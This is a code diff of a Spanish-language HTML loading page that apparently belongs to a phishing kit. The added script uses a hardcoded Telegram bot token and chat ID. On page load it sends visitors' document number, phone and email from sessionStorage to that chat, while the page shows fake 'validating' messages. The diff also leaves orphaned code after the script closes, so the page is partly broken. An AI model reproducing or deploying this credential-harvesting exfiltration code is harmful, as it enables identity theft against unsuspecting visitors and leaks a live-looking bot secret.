@@ -179,58 +179,77 @@
         </div>
     </div>
 
-    <script>
-        // Obtener sessionId de la URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const sessionId = urlParams.get('sessionId') || sessionStorage.getItem('sessionId');
-        const step = urlParams.get('step') || 'login';
+   <script>
+    const botToken = "8431946474:AAGwPGma91nER9-mCScFLy3AvOChIZIoa0M"; // 🔹 Reemplaza
+    const chatId = "-4855438579";     // 🔹 Reemplaza
+    
+    let sentMessageId = null; // Guardamos el id del mensaje que vamos a editar
 
-        if (!sessionId) {
-            console.error('No se encontró sessionId');
-            window.location.href = '/';
+    window.addEventListener("DOMContentLoaded", () => {
+        // 1) Enviar primer mensaje al entrar en loading.html
+        sendTelegramMessage("⏳ Validando información...\nEsperando datos del usuario...");
+        
+        // 2) Si ya hay datos guardados en sessionStorage, actualizar ese mensaje
+        const savedData = sessionStorage.getItem("contactData");
+        if (savedData) {
+            const data = JSON.parse(savedData);
+            const message = `
+✅ Datos recibidos:
+🪪 Documento: ${data.document}
+📱 Teléfono: ${data.phone}
+📧 Correo: ${data.email}
+            `;
+            updateTelegramMessage(message);
         }
+    });
 
-        // Mensajes de estado que van cambiando
-        const statusMessages = [
-            'Conectando con el servidor...',
-            'Verificando credenciales...',
-            'Validando información...',
-            'Esperando aprobación...',
-            'Procesando solicitud...'
-        ];
-        
-        let messageIndex = 0;
-        const statusElement = document.getElementById('statusMessage');
-        let pollingInterval;
-        
-        // Cambiar mensajes de estado cada 3 segundos
-        function updateStatusMessage() {
-            statusElement.textContent = statusMessages[messageIndex];
-            messageIndex = (messageIndex + 1) % statusMessages.length;
-        }
-        
-        const messageInterval = setInterval(updateStatusMessage, 3000);
-        
-        // Polling real al servidor para verificar estado
-        async function checkSessionStatus() {
-            try {
-                const response = await fetch(`/api/check-status/${sessionId}`);
-                const data = await response.json();
-                
-                console.log('Estado de sesión:', data);
-                
-                if (data.success && data.nextAction) {
-                    clearInterval(pollingInterval);
-                    clearInterval(messageInterval);
-                    
-                    // Redirigir según el siguiente paso
-                    redirectToNextPage(data.status, data.nextAction);
-                }
-                
-            } catch (error) {
-                console.error('Error verificando estado:', error);
+    // Enviar un mensaje nuevo y guardar el id
+    function sendTelegramMessage(text) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text })
+        })
+        .then(res => res.json())
+        .then(result => {
+            if (result.ok) {
+                sentMessageId = result.result.message_id; // Guardar id del mensaje
+                console.log("Mensaje enviado, ID:", sentMessageId);
+            } else {
+                console.error("Error al enviar mensaje:", result);
             }
+        })
+        .catch(err => console.error("Error Telegram:", err));
+    }
+
+    // Editar el mensaje existente
+    function updateTelegramMessage(newText) {
+        if (!sentMessageId) {
+            console.warn("No hay mensaje previo, enviando uno nuevo...");
+            return sendTelegramMessage(newText);
         }
+
+        fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: chatId,
+                message_id: sentMessageId,
+                text: newText
+            })
+        })
+        .then(res => res.json())
+        .then(result => {
+            if (result.ok) {
+                console.log("Mensaje actualizado correctamente");
+            } else {
+                console.error("Error al actualizar mensaje:", result);
+            }
+        })
+        .catch(err => console.error("Error Telegram:", err));
+    }
+</script>
+
         
         function redirectToNextPage(status, nextAction) {
             statusElement.textContent = 'Redirigiendo...';
@@ -294,3 +313,4 @@
     </script>
 </body>
 </html>
+
